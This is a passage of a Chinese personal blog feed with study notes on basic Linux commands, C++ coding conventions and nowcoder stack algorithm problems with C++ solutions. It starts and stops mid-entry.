块处。由于堆栈展开需要降低程序的执行速度，并且需要额外的内存和调用开销，因此异常处理可能会对程序的性能产生负面影响。</p><p>总的来说，在代码中使用 <code>try</code> 和 <code>catch</code> 不会直接影响程序的性能，但是在发生异常时需要进行额外的处理，从而可能导致程序变慢。因此，在实际编写代码时，应该避免滥用异常处理，仅在必要时使用 <code>try</code> 和 <code>catch</code> 来处理异常，以提高程序的性能和效率。</p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux随记</title>
    <link href="/2023/04/19/linux/linux%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/04/19/linux/linux%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="linux随记"><a href="#linux随记" class="headerlink" title="linux随记"></a>linux随记</h1><ol><li><p>sudo </p><p>在Linux系统中，sudo是一种特殊权限（superuser do）命令，允许普通用户以超级管理员的身份执行特定任务或命令。管理员可以使用sudo命令来授权其他用户执行某些特定操作，而无需共享root账户密码</p></li><li><p><code>Ctrl+l</code></p><p>清屏 </p></li><li><p><code>-R</code></p><p>表示递归的参数，用于文件夹相关的参数</p></li><li><p><code>su - root</code></p><p>切换到<code>root</code>用户</p></li><li><p><code>exit</code></p><p>用于退出<code>root</code></p></li><li><p><code>|</code>管道符</p><p>把管道符左边的结果，作为右边命令的输入</p></li><li><p><code>Ctrl+x</code></p><p>也可以用于退出<code>root</code></p></li><li><p><code>shell</code>编程里面</p><p><code>#</code>后面都是注释</p></li><li><p><code>./</code>执行文件</p></li><li><p>使用find查找最近几天有过改动的文件</p><blockquote><p>find &#x2F;home&#x2F;book -mtime -2 &#x2F;&#x2F;查找&#x2F;home目录下两天内有变动的文件。</p></blockquote></li><li></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常用指令</title>
    <link href="/2023/04/17/linux/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2023/04/17/linux/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h1><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><ol><li><p><code>LInux</code>的根目录是树形结构</p><p>Linux没有盘符（C盘等）的概念，只有一个根目录<code>/</code></p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png"></p></li><li><p>文件路径的描述方式</p><p>使用<code>/</code></p><p><code>windows</code>使用<code>\</code></p><ul><li>注意文件路径的开始必须是<code>/</code>,第一个是根目录，后面的是层级关系</li></ul></li></ol><h2 id="LInux命令入门"><a href="#LInux命令入门" class="headerlink" title="LInux命令入门"></a>LInux命令入门</h2><ol><li><p>通用格式</p><p><code>command [-options] [parameter]</code></p><ul><li>command 命令本身</li><li>-options 可选的选项(非必填)</li><li>parameter 可选的选项(非必填)</li></ul></li><li><p>ls -r &#x2F;home</p><p>查看<code>home</code>里面的东西</p></li></ol><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a><code>ls</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/ls%E5%91%BD%E4%BB%A4.png"></p><ul><li><p>默认的工作目录是<code>home</code>目录</p></li><li><p>以平埔的形式展示子目录</p></li><li><p>小结</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/ls%E6%80%BB%E7%BB%93.png"></p></li></ul><ol><li><p>ls 的参数</p><ul><li><code>-a</code> all 列出全部文件（包括隐藏文件）</li><li><code>-l</code> 以列表的形式展示内容，并展示更多的信息</li><li>组和（指的是多个指令同时）<ul><li><code>-l -a</code></li><li><code>-ls</code></li><li><code>-al</code></li></ul></li><li><code>ls -l -a /</code>在根目录上使用<code>-a -l</code></li></ul><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/ls%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93.png"></p></li></ol><h3 id="cd"><a href="#cd" class="headerlink" title="cd"></a><code>cd</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/cd.png"></p><h3 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a><code>pwd</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/pwd.png"></p><ul><li><code>.</code>表示当前目录</li><li><code>..</code>表示上一级目录</li><li><code>~</code>表示<code>home</code>目录</li></ul><h3 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a><code>mkdir</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/mkdir.png"></p><ul><li><p><code>-p</code> 创建一整个链条</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/mkdir_p.png"></p></li></ul><h3 id="touch"><a href="#touch" class="headerlink" title="touch"></a><code>touch</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/touch.png"></p><p>如果原来有这个文件，则修改这个文件的标签，使得时间域本电脑时间一致</p><p>如果没有这个文件，则创建这个文件</p><ol><li><p>文件夹的颜色时深色</p><p>同时还可以使用<code>ls</code>如果前缀是<code>d</code>则是文件夹，是<code>-</code>是文件</p></li></ol><h3 id="comm"><a href="#comm" class="headerlink" title="comm"></a><code>comm</code></h3><p>比较已排序的两个人间的差异</p><ul><li><code>-1</code>：不打印出只存在于第一个文件中的行。</li><li><code>-2</code>：不打印出只存在于第二个文件中的行。</li><li><code>-3</code>：不打印出共同存在于两个文件中的行。</li><li><code>-i</code>：在比较时忽略大小写。</li><li><code>-u</code>：以一列输出文件的内容。</li></ul><h3 id="wc"><a href="#wc" class="headerlink" title="wc"></a><code>wc</code></h3><p>是一种计算文件字数、行数、字符数等信息的命令。它可以统计给定文件中的行数、单词数和字符数。</p><ul><li><code>-l</code>：仅显示行数。</li><li><code>-w</code>：仅显示单词数。</li><li><code>-m</code>：仅显示字符数。</li><li><code>-c</code>：仅显示字节数。</li><li><code>-L</code>：仅显示最长行的长度。</li></ul><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a><code>grep</code></h3><p>是一种命令行文本搜索工具，它可以根据用户提供的正则表达式在一个或多个文件中搜索匹配的行，并将其输出到标准输出。</p><ul><li><code>-c</code>：只显示搜索结果的数量，而不是每一行的内容。</li><li><code>-i</code>：忽略所搜索单词的大小写。</li><li><code>-n</code>：在输出结果中包含被匹配行的行号。</li><li><code>-v</code>：反转匹配，只输出不匹配的行。</li><li><code>-r</code>：递归搜索文件夹内所有文件。</li></ul><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a><code>cat</code></h3><ol><li><p>查看文件内容</p><p>语法： <code>cat [options] filename</code></p><p>示例： <code>cat file.txt</code></p><p>说明：该命令可以查看指定的文本文件内容。如果需要同时查看多个文件内容，可以在命令行中依次输入多个文件名即可。</p></li><li><p>创建文件</p><p>语法：<code>cat &gt; filename</code></p><p>示例： <code>cat &gt; test.txt</code></p><p>说明：该命令可以在命令行中输入文本，然后以Ctrl + D的方式结束输入，并将输入内容保存到指定的文件中。如果文件已经存在，新输入的内容会覆盖旧的内容。</p></li><li><p>合并多个文件</p><p>语法： <code>cat [option] file1 file2 &gt; newfile</code></p><p>示例： <code>cat file1.txt file2.txt &gt; mergedfile.txt</code></p><p>说明：该命令可以将多个文件合并为一个新文件。在上面的示例中，两个文件(file1.txt和file2.txt)的内容被合并到一个新文件(mergedfile.txt)中。</p></li><li><p>压缩输出信息</p><p>语法： <code>cat [options] filename | gzip &gt; filename.gz</code></p><p>示例： <code>cat file.txt | gzip &gt; file.gz</code></p></li></ol><h3 id="more"><a href="#more" class="headerlink" title="more"></a><code>more</code></h3><ol><li>more可以用于查看，相对于<code>cat</code>，<code>more</code>支持翻页</li><li>使用<code>q</code>退出浏览状态</li></ol><h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a><code>cp</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/cp%E5%91%BD%E4%BB%A4.png"></p><h3 id="mv"><a href="#mv" class="headerlink" title="mv"></a><code>mv</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/mv.png"></p><p>如果目的地不存在，那么这个文件就会改名成为目标文件</p><p>而且支持文件夹的移动</p><h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a><code>rm</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/rm.png"></p><p>注意删除文件夹需要<code>-r</code></p><p>可以写多个参数，表示删除多个项目</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/rm%E9%80%9A%E9%85%8D%E7%AC%A6.png"></p><h3 id="which"><a href="#which" class="headerlink" title="which"></a><code>which</code></h3><p>用于查找命令的执行文件</p><ol><li><p>语法</p><p><code>which</code> 要查找的命令</p></li></ol><h3 id="find"><a href="#find" class="headerlink" title="find"></a><code>find</code></h3><p>用于查找文件</p><ol><li><p>命令</p><p><code>find / -name &quot;filename&quot;</code></p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/find.png"></p></li><li><p>也可以使用通配符</p><p><code>find 起始路径 -name &quot;*text*&quot;</code></p></li><li><p>使用文件大小</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/find%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F.png"></p></li></ol><h3 id="grep-1"><a href="#grep-1" class="headerlink" title="grep"></a><code>grep</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/grep.png"></p><h3 id="wc-1"><a href="#wc-1" class="headerlink" title="wc"></a><code>wc</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/wc.png"></p><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a><code>echo</code></h3><p>在对话框中打印</p><ol><li><p>语法</p><p><code>echo</code> 输出的内容</p></li><li><p>反引号 </p><p>&#96;&#96;将所包括的内容作为命令输出</p></li><li><p>重定向符</p><p><code>&gt;</code> 将左侧命令覆盖到写入到符号右侧指定的文件中</p><p><code>&gt;&gt;</code>将左侧命令的结果，追加到右侧的指定文件中</p></li></ol><h3 id="vim文本编辑器"><a href="#vim文本编辑器" class="headerlink" title="vim文本编辑器"></a><code>vim</code>文本编辑器</h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/vim.png"></p><ol><li><p><code>vim</code> 文件路径</p><p>如果不存在，将会编写新的文件</p><p>存在就只会编辑已有的命令</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/vim%E7%9B%B8%E5%85%B3%E6%A8%A1%E5%BC%8F.png"></p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%BF%AB%E6%8D%B7%E9%94%AE.png"></p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F%E5%BF%AB%E6%8D%B7%E9%94%AE.png"></p></li></ol><h3 id="ln"><a href="#ln" class="headerlink" title="ln"></a><code>ln</code></h3><p>它的功能是为某一个文件在另外一个位置建立一个同步的链接。</p><p>可以看成创建一个快捷方式</p><h3 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a><code>chmod</code></h3><blockquote><p>chmod [权限设置方式] [文件名]</p></blockquote><ol><li><p>它允许用户改变文件或目录的读取、写入和执行权限。它可用于设置文件的所有者、组、其他用户的访问权限。</p></li><li><p>权限表示有读(r)、写(w)、执行(x)三种，用字母或数字来表示。其中，字母表示法为 “u” 表示文件所有者，”g” 表示文件所属组，”o” 表示其他用户， “a” 表示所有用户。</p><ul><li><p>数字表示法</p><p>- </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">644</span> example.txt<br></code></pre></td></tr></table></figure><p>将文件 example.txt 的权限修改为 6（110）（所有者读写）、4（100）（组只读）和 4（100）（其他用户只读）。</p></li><li><p>符号表示法</p><p>使用符号表示法，命令格式为：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">chmod [who] [+ | - | =] [permission] <span class="hljs-symbol">FILE</span>...<br></code></pre></td></tr></table></figure><p>其中 [who] 可以是 u（所有者）、g（所属组）、o（其他用户）、a（所有用户），+ 表示新增权限，- 表示移除权限，&#x3D; 表示赋予权限。</p></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统概述</title>
    <link href="/2023/04/17/linux/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/"/>
    <url>/2023/04/17/linux/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<ol><li><p>计算机由哪两个部分组成</p><p>软件和硬件</p></li><li><p>操作系统是什么？</p><p>操作系统是软件的一种</p><p>主要作用是协助用户调度硬件工作充当用户和计算机硬件之间的桥梁</p></li><li><p>不同文件的用途</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有效括号序列</title>
    <link href="/2023/04/17/%E7%AE%97%E6%B3%95/newcoder/%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7%E5%BA%8F%E5%88%97/"/>
    <url>/2023/04/17/%E7%AE%97%E6%B3%95/newcoder/%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7%E5%BA%8F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/37548e94a270412c8b9fb85643c8ccc2?tpId=308&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/company">有效括号序列_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7%E5%BA%8F%E5%88%97.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * @param s string字符串 </span><br><span class="hljs-comment">     * @return bool布尔型</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValid</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>                stack&lt;<span class="hljs-type">char</span>&gt; stack;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;item: s) &#123;<br>            <span class="hljs-keyword">if</span> (item == <span class="hljs-string">&#x27;[&#x27;</span> || item == <span class="hljs-string">&#x27;(&#x27;</span> || item == <span class="hljs-string">&#x27;&#123;&#x27;</span>) &#123;<br>                stack.<span class="hljs-built_in">push</span>(item);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (item == <span class="hljs-string">&#x27;]&#x27;</span> || item == <span class="hljs-string">&#x27;)&#x27;</span> || item == <span class="hljs-string">&#x27;&#125;&#x27;</span>)&#123;<br>                <span class="hljs-keyword">if</span>(stack.<span class="hljs-built_in">empty</span>())&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<span class="hljs-comment">//防止栈区为empty，还取出top</span><br>                <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&#x27;]&#x27;</span>)&#123;<br>                    <span class="hljs-keyword">if</span>(stack.<span class="hljs-built_in">top</span>()!=<span class="hljs-string">&#x27;[&#x27;</span>)&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&#x27;)&#x27;</span>)&#123;<br>                    <span class="hljs-keyword">if</span>(stack.<span class="hljs-built_in">top</span>()!=<span class="hljs-string">&#x27;(&#x27;</span>)&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&#x27;&#125;&#x27;</span>)&#123;<br>                    <span class="hljs-keyword">if</span>(stack.<span class="hljs-built_in">top</span>()!=<span class="hljs-string">&#x27;&#123;&#x27;</span>)&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!stack.<span class="hljs-built_in">empty</span>())&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//防止出现只有右开口符号的请情况</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <br>&#125;;<br></code></pre></td></tr></table></figure><p>改进代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * @param s string字符串 </span><br><span class="hljs-comment">     * @return bool布尔型</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValid</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>        stack&lt;<span class="hljs-type">char</span>&gt; stack;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item:s)&#123;<br>            <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&#x27;[&#x27;</span>)&#123;<br>                stack.<span class="hljs-built_in">push</span>(<span class="hljs-string">&#x27;]&#x27;</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&#x27;&#123;&#x27;</span>)&#123;<br>                stack.<span class="hljs-built_in">push</span>(<span class="hljs-string">&#x27;&#125;&#x27;</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&#x27;(&#x27;</span>)&#123;<br>                stack.<span class="hljs-built_in">push</span>(<span class="hljs-string">&#x27;)&#x27;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(stack.<span class="hljs-built_in">empty</span>())&#123;<br>                <span class="hljs-comment">//防止空取top</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==stack.<span class="hljs-built_in">top</span>())&#123;<br>                stack.<span class="hljs-built_in">pop</span>();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//提高执行效率，如果不对应，就直接返回</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> stack.<span class="hljs-built_in">empty</span>();<br>        <span class="hljs-comment">//当true,则说明一一对应</span><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7%E5%BA%8F%E5%88%97%E6%8F%90%E7%A4%BA.gif"></p></li><li><p>理解</p><ul><li>整体只会遍历一次，遇到开口向右的符号就存进<code>stack</code>，反之对比出栈</li></ul></li><li><p>问题</p><ul><li><p>为什么返回<code>stack.empty()</code></p><blockquote><p>有且仅当，一一对应时才能返回</p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cpp代码规范</title>
    <link href="/2023/04/14/c++/cpp%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/"/>
    <url>/2023/04/14/c++/cpp%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="c-代码规范"><a href="#c-代码规范" class="headerlink" title="c++代码规范"></a>c++代码规范</h1><h2 id="基本代码规范"><a href="#基本代码规范" class="headerlink" title="基本代码规范"></a>基本代码规范</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p><strong>方法一</strong></p><ol><li>包括两个文件一个是<code>inc</code>这个目录放<code>.h</code>文件，还有一个<code>src</code>目录，放置<code>.cpp</code>文件。</li></ol><p><strong>方法二</strong></p><ol><li>按照功能分文件</li></ol><h3 id="头文件结构"><a href="#头文件结构" class="headerlink" title="头文件结构"></a>头文件结构</h3><p><strong>处理方式一</strong></p><ol><li>使用<code>ifndef</code>&#x2F;<code>define</code>&#x2F;<code>endif</code></li></ol><p><strong>处理方式二</strong></p><ol><li>使用<code>#pragma once</code></li></ol><h3 id="头文件的包含"><a href="#头文件的包含" class="headerlink" title="头文件的包含"></a>头文件的包含</h3><ol><li>使用路径包括</li></ol><h3 id="名字空间"><a href="#名字空间" class="headerlink" title="名字空间"></a>名字空间</h3><ol><li>建议使用二级命名空间，第一个命名空间是项目名称，第二个是模块名称</li></ol><h3 id="代码行的使用"><a href="#代码行的使用" class="headerlink" title="代码行的使用"></a>代码行的使用</h3><ol><li><p>一行代码只做一件事</p></li><li><p>在定义变量的时候初始化变量</p><img src="https://pictuures-1317182407.cos.ap-chengdu.myqcloud.com/%E8%A7%84%E8%8C%83%E4%BB%A3%E7%A0%81.png?q-sign-algorithm=sha1&q-ak=AKID62gNbIugj-rlltKDtx9qQ0_NXvaVQ5eNhwwxGkulFmHBe0ryycrOgtLN1PJ48AwE&q-sign-time=1681488019;1681491619&q-key-time=1681488019;1681491619&q-header-list=host&q-url-param-list=&q-signature=e4a689d272023a355d0531e4c2a8e304b91e3f84&x-cos-security-token=0TXuI2oo8Sb5JGse9bsw7agND0rUgf7ab53099746c0362b69c92e54403bee6c1Ar87iX4JGt_CJ_4-yiOqn5qq0oYOzq5Mvx5tZYU4UMH4CzPOLXAXckkgflDKpLF8EFsMkPbIaiZBHDbuZKO7M7wuhqklRkTpvoysQC3p_jlBgtUCJW9hscAxiDk_3qQDgHzlDrdCKzHaDdduRuoDolrxPPI9XoPQLvaqMiBwujWJDhXsHm8ruOPtekvK2ev8" style="zoom:150%;" /></li></ol><h3 id="注释的使用"><a href="#注释的使用" class="headerlink" title="注释的使用"></a>注释的使用</h3><ol><li>版本，版权的说明</li><li>函数接口的说明</li><li>重要代码</li><li>代码即注释</li></ol><h3 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h3><ol><li><p><code>class</code></p><p>采取大驼峰命名法</p><p>例如<code>MyClass</code></p></li><li><p>函数</p><p>采取驼峰命名</p></li><li><p>也可以在中间添加<code>_</code></p><p><code>creat_func</code>前后都是小写</p></li><li><p>变量命名</p><p>变量的意思</p></li></ol><h3 id="表达式和语句"><a href="#表达式和语句" class="headerlink" title="表达式和语句"></a>表达式和语句</h3><ol><li>添加<code>()</code></li><li>不编写太复杂的表达式</li></ol><h2 id="概念抽象与命名"><a href="#概念抽象与命名" class="headerlink" title="概念抽象与命名"></a>概念抽象与命名</h2><ol><li>类的命名是名词</li><li>函数是动词</li></ol><h2 id="大道至简"><a href="#大道至简" class="headerlink" title="大道至简"></a>大道至简</h2><ol><li>模块复用</li><li>化繁为简</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c++基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈的压入和弹出序列</title>
    <link href="/2023/04/13/%E7%AE%97%E6%B3%95/newcoder/%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E5%92%8C%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97/"/>
    <url>/2023/04/13/%E7%AE%97%E6%B3%95/newcoder/%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E5%92%8C%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/d77d11405cc7470d82554cb392585106?tpId=308&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/company">栈的压入、弹出序列_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E6%A0%88%E7%9A%84%E5%8E%8B%E5%85%A5%E5%92%8C%E5%BC%B9%E5%87%BA%E5%BA%8F%E5%88%97.png"></p><ol><li><p>代码</p><p>方法一</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsPopOrder</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; pushV, vector&lt;<span class="hljs-type">int</span>&gt; popV)</span> </span>&#123;<br>        stack&lt;<span class="hljs-type">int</span>&gt; stack;<br>        <span class="hljs-type">int</span> j = <span class="hljs-number">0</span>, n = pushV.<span 